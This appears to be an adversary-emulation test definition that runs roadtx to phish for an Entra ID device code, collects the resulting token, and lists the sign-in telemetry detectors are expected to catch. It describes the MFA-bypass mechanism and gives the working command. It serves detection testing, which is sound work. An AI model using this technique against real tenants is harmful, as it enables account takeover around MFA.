attack_technique: T1078.004
display_name: "AiTM – Device Code Phishing (Entra ID)"
atomic_tests:
  - name: "Device Code Flow Phishing via roadtx"
    auto_generated_guid: a1b2c3d4-e5f6-7890-abcd-ef1234567890
    description: |
      Emulates device-code phishing: sends a victim a code to enter at
      microsoft.com/devicelogin, then polls for the resulting token.
      Exercises the Entra "device code" sign-in pattern and bypasses MFA
      because the victim completes MFA on their own device.
      Wraps roadtx (roadtools); requires roadtx installed via
      Install-TackleboxDependencies -Component roadtx.
    supported_platforms:
      - windows
      - linux
      - macos
    input_arguments:
      tenant_id:
        description: "Entra tenant ID (GUID) of the lab tenant."
        type: String
        default: "00000000-0000-0000-0000-000000000000"
      client_id:
        description: "OAuth2 client ID to request a device code for (default: Azure CLI app)."
        type: String
        default: "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
      resource:
        description: "Target resource URI."
        type: String
        default: "https://graph.microsoft.com"
      token_output_path:
        description: "Path to write the resulting token cache file."
        type: Path
        default: "#{token_cache_path}"
    executor:
      name: powershell
      command: |
        roadtx gettokens `
          --device-code `
          --client '#{client_id}' `
          --resource '#{resource}' `
          --tenant '#{tenant_id}' `
          --tokenfile '#{token_output_path}'
    cleanup_command: |
      if (Test-Path -LiteralPath '#{token_output_path}') {
          Remove-Item -LiteralPath '#{token_output_path}' -Force
      }
    references:
      - "https://dirkjanm.io/phishing-for-microsoft-entra-primary-refresh-tokens/"
      - "https://aadinternals.com/post/aitm/"
    auth_profile: "device-code"
    defense_evasion: "MFA bypass via device-code flow (victim completes MFA; attacker receives token)"
    requires_token: false
    expected_telemetry:
      - source: entra_signin
        match:
          clientAppUsed: "Mobile Apps and Desktop clients"
          conditionalAccessStatus: "success"
        within_minutes: 15
      - source: entra_signin
        match:
          clientAppUsed: "Mobile Apps and Desktop clients"
          riskLevelDuringSignIn: "none"
        within_minutes: 15
    exercises_chokepoint:
      id: "DC-AUTH-001"
      url: "https://detectionchokepoints.com/auth/device-code-phishing"
